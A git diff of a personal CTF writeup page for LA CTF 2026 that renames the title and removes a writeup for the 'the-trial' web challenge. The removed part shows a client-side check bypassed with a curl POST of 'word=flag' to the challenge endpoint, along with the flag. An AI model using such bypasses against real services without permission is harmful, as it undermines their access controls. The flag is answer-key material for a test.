@@ -1,5 +1,5 @@
 ---
-title: LA CTF 2026 - All Solves
+title: LA CTF 2026
 date: 2026-02-10 00:01:00 +0800
 categories: [Writeups, LA CTF]
 tags: [ctf, web, pwn, crypto, rev, misc]
@@ -7,7 +7,7 @@ tags: [ctf, web, pwn, crypto, rev, misc]
 
 {% raw %}
 
-# LA CTF 2026 Writeups
+# LA CTF 2026
 
 A collection of my highlighted solutions from LA CTF 2026, organized by category.
 
@@ -324,127 +324,6 @@ lactf{4pl3tc4tion_s3curi7y}
 ### Tags
 
 `web` `crypto-misuse` `aes-gcm` `cookie-forgery` `bit-flipping` `auth-tag-bruteforce` `file-read`
-
-
----
-
-
-### [web] the-trial
-
-
-
-### Overview
-
-| Attribute | Value |
-| :--- | :--- |
-| **Challenge Name** | The Trial |
-| **Category** | Web |
-| **Points** | TBD |
-| **Solves** | TBD |
-| **Difficulty** | Easy |
-| **Author** | LAC TF |
-
-### Problem Statement
-
-> I think the main takeaway from Kafka is that bureaucracy is bad? Or maybe it's that we live in a society.
-
-**URL**: `https://the-trial.chall.lac.tf/`
-
-The challenge presents a web page with a slider, a "Submit" button, and an "I'm Feeling Lucky" button. The text "I want the [text]" updates as you move the slider. The goal is to get the flag.
-
-### TL;DR
-
-*   Inspected the client-side JavaScript to understand the submission logic.
-*   Identified that the "Submit" button sends a POST request to `/getflag` with the content of the displayed text.
-*   Bypassed the client-side slider mechanic by directly sending a curl request with `word=flag`.
-*   Received the flag in the response.
-
-### Background Knowledge
-
-*   **Client-Side Validation**: Security controls implemented only on the client (browser) side can be easily bypassed because the user has full control over the client environment.
-*   **HTTP Requests**: Web applications communicate via HTTP. Tools like `curl` or Burp Suite allow users to craft raw requests, ignoring any restrictions imposed by the graphical user interface.
-
-### Solution
-
-#### Step 1: Reconnaissance
-
-Upon visiting the website, we see a simple interface:
-*   A sentence "I want the [random string]."
-*   A slider that changes the random string.
-*   A "Submit" button.
-*   An "I'm Feeling Lucky" button (which redirects to a Rickroll, based on the source code).
-
-We inspected the page source to understand how the application works.
-
-```html
-<script>
-    // ... variables ...
-    const cm = "kjzhcyprdolnbgusfiawtqmxev";
-    function update() {
-        let s = "";
-        let n = val.value;
-        for (let i = 0; i < 4; i ++) {
-            s += cm[n % cm.length];
-            n = Math.floor(n / cm.length);
-        }
-        if (disp.textContent !== s) {
-            disp.textContent = s;
-        }
-    }
-    setInterval(update, 10);
-    submit.addEventListener("click", async () => {
-        const req = await fetch("/getflag", {
-            method: "POST",
-            body: `word=${encodeURIComponent(disp.textContent)}`,
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-            }
-        });
-        msg.textContent = await req.text();
-    });
-    // ...
-</script>
-```
-
-#### Step 2: Vulnerability Analysis
-
-The JavaScript code reveals the following:
-1.  The `update` function generates a string based on the slider value.
-2.  The `submit` button listener sends a POST request to `/getflag`.
-3.  The request body is `word=${encodeURIComponent(disp.textContent)}`.
-
-The vulnerability is that the server trusts the input parameter `word` to determine if it should release the flag. While the UI makes it difficult (or a puzzle) to generate the string "flag" using the slider, we can bypass the UI entirely.
-
-#### Step 3: Exploitation
-
-Instead of trying to reverse engineer the slider math to make `disp.textContent` equal "flag", we can simply send the POST request directly using `curl`.
-
-We constructed a request that mimics what the browser would send if the text were "flag".
-
-```bash
-curl -X POST https://the-trial.chall.lac.tf/getflag -d "word=flag"
-```
-
-#### Step 4: Flag Capture
-
-The server responded immediately with the flag:
-
-```text
-Ah, you want the flag? Well here you go! lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}
-```
-
-### Tools Used
-
-| Tool | Purpose |
-| :--- | :--- |
-| **Web Browser (Chrome/Firefox)** | Initial exploration and source code inspection. |
-| **curl** | Sending the raw HTTP POST request to bypass client-side logic. |
-
-### Lessons Learned
-
-*   **Never trust the client**: Any logic that runs in the browser can be modified or bypassed by the user.
-*   **Server-side enforcement**: Access controls and critical state validation must happen on the server.
-*   **Direct API access**: Always test endpoints directly rather than assuming the UI is the only way to interact with them.
 
 
 ---
